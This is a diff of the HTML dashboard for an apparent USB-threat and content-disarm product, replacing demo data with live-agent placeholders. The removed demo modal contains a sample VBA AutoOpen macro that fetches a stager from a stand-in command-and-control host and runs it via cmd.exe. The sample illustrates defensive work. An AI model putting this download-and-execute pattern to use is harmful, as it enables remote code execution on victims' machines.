@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="description" content="OmniConnect Sentinel — Enterprise USB Threat Interceptor & Ring 3 Deep CDR Engine">
+  <meta name="sentinel-bearer-token" content="">
   <title>OmniConnect Sentinel | Enterprise Hardware Interceptor & CDR Dashboard</title>
   <link rel="stylesheet" href="style.css">
 </head>
@@ -27,7 +28,7 @@
         <!-- System Health Pill -->
         <div class="system-badge" id="systemHealthBadge" role="status" aria-label="System operational status">
           <span class="system-pulse" aria-hidden="true"></span>
-          <span>UMDF Host: Isolated & Active (0 BSOD)</span>
+          <span>Connecting to Local Sentinel Agent (127.0.0.1)...</span>
         </div>
 
         <!-- Persona Switcher -->
@@ -58,11 +59,11 @@
           <span class="kpi-human-note">100% Rebuilt</span>
         </span>
         <div class="kpi-value-group">
-          <span class="kpi-value num" id="kpiFilesCleaned">4,812</span>
+          <span class="kpi-value num" id="kpiFilesCleaned">0</span>
           <span class="kpi-unit">payloads</span>
         </div>
         <div>
-          <span class="kpi-delta safe">✓ 0 Macros Survived</span>
+          <span class="kpi-delta safe" id="kpiCdrDelta">✓ 0 Macros Survived</span>
         </div>
       </div>
 
@@ -76,7 +77,7 @@
           <span class="kpi-unit">active threats</span>
         </div>
         <div>
-          <span class="kpi-delta safe">✓ 2 Intercepted Today</span>
+          <span class="kpi-delta safe" id="kpiThreatDelta">✓ 0 Intercepted</span>
         </div>
       </div>
 
@@ -86,7 +87,7 @@
           <span class="kpi-human-note">Hardware Interlock</span>
         </span>
         <div class="kpi-value-group">
-          <span class="kpi-value" id="kpiPinStatusText" style="font-size: 19px;">DECOUPLED</span>
+          <span class="kpi-value kpi-value-pin" id="kpiPinStatusText">DECOUPLED</span>
         </div>
         <div>
           <span class="kpi-delta info" id="kpiPinSubtext">Safe Charge: Active</span>
@@ -103,7 +104,7 @@
           <span class="kpi-unit">UMDF Host</span>
         </div>
         <div>
-          <span class="kpi-delta safe">✓ 0% BSOD Risk</span>
+          <span class="kpi-delta safe" id="kpiPostureBadge">✓ 0% BSOD Risk</span>
         </div>
       </div>
     </section>
@@ -125,7 +126,7 @@
               <p class="card-subtitle">Real-time hardware schematic with userspace optocoupler emulation</p>
             </div>
             <button type="button" class="card-action-btn" id="btnTogglePinSimulation">
-              Simulate Peripheral Plug
+              Refresh USB Bus
             </button>
           </header>
 
@@ -133,7 +134,6 @@
             <!-- Architectural Blueprint SVG -->
             <div class="schematic-svg-wrap">
               <svg class="schematic-svg" id="usbSchematicSvg" viewBox="0 0 600 220" role="img" aria-label="Isometric USB Pin Decoupling Schematic">
-                <!-- Defs for markers and gradients -->
                 <defs>
                   <linearGradient id="vbusGrad" x1="0%" y1="0%" x2="100%" y2="0%">
                     <stop offset="0%" stop-color="#0284c7" />
@@ -161,7 +161,6 @@
                 <g id="traceDataMinus">
                   <text x="50" y="86" font-size="11" font-weight="700" fill="#475569">PIN 2: D- (Negative Data Line)</text>
                   <line id="lineDataMinusLeft" x1="50" y1="95" x2="260" y2="95" stroke="#dc2626" stroke-width="3" stroke-dasharray="4,4" />
-                  <!-- Decoupled Switch Gap -->
                   <circle cx="260" cy="95" r="4" fill="#dc2626" />
                   <line id="switchArmMinus" x1="260" y1="95" x2="310" y2="78" stroke="#dc2626" stroke-width="3" stroke-linecap="round" />
                   <circle cx="340" cy="95" r="4" fill="#dc2626" />
@@ -172,7 +171,6 @@
                 <g id="traceDataPlus">
                   <text x="50" y="126" font-size="11" font-weight="700" fill="#475569">PIN 3: D+ (Positive Data Line)</text>
                   <line id="lineDataPlusLeft" x1="50" y1="135" x2="260" y2="135" stroke="#dc2626" stroke-width="3" stroke-dasharray="4,4" />
-                  <!-- Decoupled Switch Gap -->
                   <circle cx="260" cy="135" r="4" fill="#dc2626" />
                   <line id="switchArmPlus" x1="260" y1="135" x2="310" y2="118" stroke="#dc2626" stroke-width="3" stroke-linecap="round" />
                   <circle cx="340" cy="135" r="4" fill="#dc2626" />
@@ -210,19 +208,19 @@
             <div class="electrical-strip">
               <div class="elec-item">
                 <span class="elec-label">Bus Voltage</span>
-                <span class="elec-val num" id="valVoltage">5.02 V</span>
+                <span class="elec-val num" id="valVoltage">0.00 V</span>
               </div>
               <div class="elec-item">
                 <span class="elec-label">Current Draw</span>
-                <span class="elec-val num" id="valCurrent">0.92 A</span>
+                <span class="elec-val num" id="valCurrent">0.00 A</span>
               </div>
               <div class="elec-item">
                 <span class="elec-label">Power Output</span>
-                <span class="elec-val num" id="valPower">4.62 W</span>
+                <span class="elec-val num" id="valPower">0.00 W</span>
               </div>
               <div class="elec-item">
                 <span class="elec-label">Attached Volume</span>
-                <span class="elec-val" id="valDeviceName">Kingston 3.0 (E:)</span>
+                <span class="elec-val" id="valDeviceName">No USB Volume Mounted</span>
               </div>
             </div>
           </div>
@@ -293,16 +291,16 @@
                 <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M3 6h18"/><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"/><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/></svg>
                 NIST SP 800-88 Sector Sanitizer
               </h2>
-              <p class="card-subtitle">Cryptographic 3-pass hardware block overwriting</p>
+              <p class="card-subtitle">Cryptographic 3-pass hardware block overwriting (Clear (logical))</p>
             </div>
             <button type="button" class="card-action-btn primary" id="btnInitiateSanitize">
-              Initiate Secure Wipe
+              Execute Live Clear
             </button>
           </header>
 
           <div class="sector-shredder-box">
             <div class="sector-meta-row">
-              <span>Drive: <strong>Kingston (E:)</strong></span>
+              <span id="shredTargetDrive">Target: <strong>Awaiting Live Receipt</strong></span>
               <span id="sanitizePassText">Status: <strong>Ready (Idle)</strong></span>
             </div>
 
@@ -313,19 +311,19 @@
 
             <div class="sector-legend">
               <div class="legend-item">
-                <span class="legend-swatch" style="background-color: #ffffff; border: 1px solid #cbd5e1;"></span>
+                <span class="legend-swatch swatch-unmodified"></span>
                 <span>Unmodified</span>
               </div>
               <div class="legend-item">
-                <span class="legend-swatch" style="background-color: #cbd5e1;"></span>
+                <span class="legend-swatch swatch-pass1"></span>
                 <span>Pass 1 (0x00)</span>
               </div>
               <div class="legend-item">
-                <span class="legend-swatch" style="background-color: #64748b;"></span>
+                <span class="legend-swatch swatch-pass2"></span>
                 <span>Pass 2 (0xFF)</span>
               </div>
               <div class="legend-item">
-                <span class="legend-swatch" style="background-color: #059669;"></span>
+                <span class="legend-swatch swatch-pass3"></span>
                 <span>Pass 3 (Crypto)</span>
               </div>
             </div>
@@ -343,45 +341,17 @@
               <p class="card-subtitle">Real-time content disarm and harmless reconstruction</p>
             </div>
             <button type="button" class="card-action-btn" id="btnInspectCdr">
-              View Diff
+              View Telemetry
             </button>
           </header>
 
           <div class="cdr-stream-box" id="cdrStreamBox">
             <div class="cdr-item">
               <div class="cdr-file-meta">
-                <span class="cdr-file-name">Q3_Financial_Statement.xlsm</span>
-                <span class="cdr-file-detail">
-                  <span>Excel Sheet</span>
-                  <span>•</span>
-                  <span>Stripped: VBA Macro Execute()</span>
-                </span>
+                <span class="cdr-file-name">Awaiting Live Agent Telemetry</span>
+                <span class="cdr-file-detail">Connecting to 127.0.0.1 /api/v1/status</span>
               </div>
-              <span class="cdr-badge sanitized">✓ Rebuilt Safe</span>
-            </div>
-
-            <div class="cdr-item">
-              <div class="cdr-file-meta">
-                <span class="cdr-file-name">Vendor_Onboarding_Form.pdf</span>
-                <span class="cdr-file-detail">
-                  <span>PDF Document</span>
-                  <span>•</span>
-                  <span>Purged: Embedded JS /Launch</span>
-                </span>
-              </div>
-              <span class="cdr-badge sanitized">✓ Rebuilt Safe</span>
-            </div>
-
-            <div class="cdr-item">
-              <div class="cdr-file-meta">
-                <span class="cdr-file-name">Device_Firmware_Update.bin</span>
-                <span class="cdr-file-detail">
-                  <span>Raw Binary</span>
-                  <span>•</span>
-                  <span>Hash Mismatch: Quarantine</span>
-                </span>
-              </div>
-              <span class="cdr-badge purged">✕ Blocked</span>
+              <span class="cdr-badge purged">Connecting</span>
             </div>
           </div>
         </article>
@@ -400,21 +370,18 @@
     </div>
 
     <div class="kiosk-steps-grid">
-      <!-- Step 1 -->
       <div class="kiosk-step-card active" id="kioskStep1">
         <div class="kiosk-step-num">1</div>
         <h3 class="kiosk-step-heading">Insert USB Drive</h3>
         <p class="kiosk-step-body">Plug your external flash drive into the illuminated port below.</p>
       </div>
 
-      <!-- Step 2 -->
       <div class="kiosk-step-card" id="kioskStep2">
         <div class="kiosk-step-num">2</div>
         <h3 class="kiosk-step-heading">Automatic Cleanse</h3>
         <p class="kiosk-step-body">Deep CDR engine purges macros and verifies partition boot sectors.</p>
       </div>
 
-      <!-- Step 3 -->
       <div class="kiosk-step-card" id="kioskStep3">
         <div class="kiosk-step-num">3</div>
         <h3 class="kiosk-step-heading">Safe to Remove</h3>
@@ -425,18 +392,14 @@
     <div class="kiosk-actions-row">
       <button type="button" class="kiosk-big-btn primary" id="btnKioskSimulate">
         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-        Simulate Walk-Up Cleanse
+        Execute Kiosk Scan
       </button>
       <button type="button" class="kiosk-big-btn secondary" id="btnKioskEject" disabled>
         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M9 18l6-6-6-6"/></svg>
-        Eject Drive
+        Reset Kiosk Session
       </button>
     </div>
   </main>
-
-  <!-- ==========================================================================
-       Modals (Emil Kowalski Origin-Aware / Centered Animations)
-       ========================================================================== -->
 
   <!-- Modal 1: Deep CDR Split-Screen Diff Modal -->
   <div class="modal-backdrop" id="cdrModal" role="dialog" aria-modal="true" aria-labelledby="cdrModalTitle">
@@ -444,33 +407,22 @@
       <header class="modal-header">
         <h3 class="modal-title" id="cdrModalTitle">
           <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
-          Deep CDR Inspection: Q3_Financial_Statement.xlsm
+          Deep CDR Inspection Telemetry
         </h3>
         <button type="button" class="modal-close-btn" id="btnCloseCdrModal" aria-label="Close dialog">✕</button>
       </header>
       <div class="modal-body">
-        <p style="font-size: 13px; color: var(--color-ink-secondary); margin-bottom: 14px;">
-          Comparison of the raw quarantine payload versus the sanitized reconstructed stream:
+        <p class="modal-lead-text">
+          Live inspection of backend posture, vault status, and reconstructed CDR telemetry:
         </p>
         <div class="diff-container">
           <div>
-            <h4 class="diff-pane-title danger">Quarantined (Embedded Macro)</h4>
-            <div class="diff-code-box before">Sub AutoOpen()
-  Dim xHttp As Object
-  Set xHttp = CreateObject("MSXML2.ServerXMLHTTP")
-  xHttp.Open "GET", "http://malicious.c2/stager.bin", False
-  xHttp.Send
-  Shell "cmd.exe /c " & xHttp.responseText
-End Sub</div>
+            <h4 class="diff-pane-title danger">Inbound / Quarantine Telemetry</h4>
+            <div class="diff-code-box before" id="cdrDiffBefore">No active quarantine diff loaded (live mode).</div>
           </div>
           <div>
-            <h4 class="diff-pane-title safe">Sanitized (Reconstructed)</h4>
-            <div class="diff-code-box after">[OMNICONNECT CDR DISARM NOTICE]
-- OLE Automation Stream: Purged
-- Macro AutoOpen(): Stripped
-- Binary Code Blocks: Purged
-- Clean XML Structure: Re-serialized
-- SHA-256 Digest: 8f4a2e... [VERIFIED]</div>
+            <h4 class="diff-pane-title safe">Sanitized / Reconstructed Output</h4>
+            <div class="diff-code-box after" id="cdrDiffAfter">Awaiting live CDR sanitization event from sentinel-cdr-worker.</div>
           </div>
         </div>
       </div>
@@ -488,22 +440,22 @@ End Sub</div>
         <button type="button" class="modal-close-btn" id="btnCloseMitreModal" aria-label="Close dialog">✕</button>
       </header>
       <div class="modal-body">
-        <div style="display: flex; flex-direction: column; gap: 14px;">
+        <div class="mitre-modal-stack">
           <div>
-            <h4 style="font-size: 12px; font-weight: 700; color: var(--color-ink-muted); text-transform: uppercase;">Threat Description</h4>
-            <p id="mitreModalDesc" style="font-size: 13px; color: var(--color-ink-secondary); margin-top: 4px;">
+            <h4 class="mitre-modal-label">Threat Description</h4>
+            <p id="mitreModalDesc" class="mitre-modal-desc">
               Adversaries move into systems by copying malware to removable media and taking advantage of auto-run features.
             </p>
           </div>
           <div>
-            <h4 style="font-size: 12px; font-weight: 700; color: var(--color-ink-muted); text-transform: uppercase;">Ring 3 UMDF Mitigation</h4>
-            <p id="mitreModalMitigation" style="font-size: 13px; color: var(--color-status-safe); font-weight: 600; margin-top: 4px;">
+            <h4 class="mitre-modal-label">Ring 3 UMDF Mitigation</h4>
+            <p id="mitreModalMitigation" class="mitre-modal-mitigation">
               Userspace Storage Interceptor isolates volume mounting, disabling AutoRun and sanitizing LNK directory stomping before explorer.exe reads the volume.
             </p>
           </div>
           <div>
-            <h4 style="font-size: 12px; font-weight: 700; color: var(--color-ink-muted); text-transform: uppercase;">Compliance Mapping</h4>
-            <p style="font-size: 12px; color: var(--color-ink-muted); margin-top: 4px;">
+            <h4 class="mitre-modal-label">Compliance Mapping</h4>
+            <p class="mitre-modal-compliance">
               NIST SP 800-53 Rev. 5: MP-6, MP-7 (Media Sanitization & Use) · CIS Control 8.4
             </p>
           </div>
@@ -512,11 +464,11 @@ End Sub</div>
     </div>
   </div>
 
-  <!-- Footer with Adversarial Stress Testing Toggle (break-ui) -->
-  <footer style="max-width: var(--max-content-width); margin: 0 auto; padding: 0 24px 24px; display: flex; justify-content: space-between; align-items: center; font-size: 12px; color: var(--color-ink-muted);">
+  <!-- Footer -->
+  <footer class="site-footer">
     <span>OmniConnect Sentinel © 2026. Zero BSOD Ring 3 Architecture.</span>
-    <button type="button" class="card-action-btn" id="btnStressToggle" style="font-size: 11px;">
-      Adversarial Stress Test (break-ui)
+    <button type="button" class="card-action-btn footer-action-btn" id="btnStressToggle">
+      Trigger Live Scan (/api/v1/scan)
     </button>
   </footer>
 
